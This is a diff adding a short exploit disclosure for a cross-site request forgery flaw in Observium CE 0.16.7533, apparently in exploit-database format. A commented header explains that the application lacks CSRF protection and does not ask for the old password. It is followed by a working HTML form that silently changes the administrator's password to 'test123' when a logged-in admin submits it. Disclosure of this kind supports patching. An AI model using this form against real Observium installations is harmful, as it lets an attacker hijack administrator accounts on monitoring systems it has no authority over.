@@ -1,0 +1,36 @@
+<!--
+# Exploit title: Observium Commercial - CSRF
+# Author: Dolev Farhi
+# Contact: dolevf at protonmail.com
+# Date: 28-04-2016
+# Vendor homepage: http://observium.org/
+# Software version: CE 0.16.7533
+
+ 
+# Details:
+Observium is a low-maintenance auto-discovering network monitoring platform supporting a wide range of device types, platforms and operating systems including Cisco, Windows, Linux, HP, Juniper, Dell, FreeBSD, Brocade, Netscaler, NetApp and many more. Observium focuses on providing a beautiful and powerful yet simple and intuitive interface to the health and status of your network.
+
+CSRF details
+due to lack of csrf protection, it is possible to create an additional administrator user, or change the current administrator password since it does not ask for the previous password before changing it. 
+i.e. New password <Enter new pass> & retype password <Enter new pass>
+instead of having to insert the older password.
+such an attack would look like this:
+-->
+
+<html>
+<div align="center">
+<pre>
+ 
+<h2><b>Change admin password<b></h2>
+<body>
+<form
+action="http://observiumIP/edituser/user_id=1/"
+method="POST">
+<input type="hidden" name="action" value="changepass" />
+<input type="hidden" name="new_pass" value="test123" />
+<input type="hidden" name="new_pass2" value="test123" />
+<input type="submit" name="submit" value="save" />
+    </form>
+    </body>
+</div>
+</html>
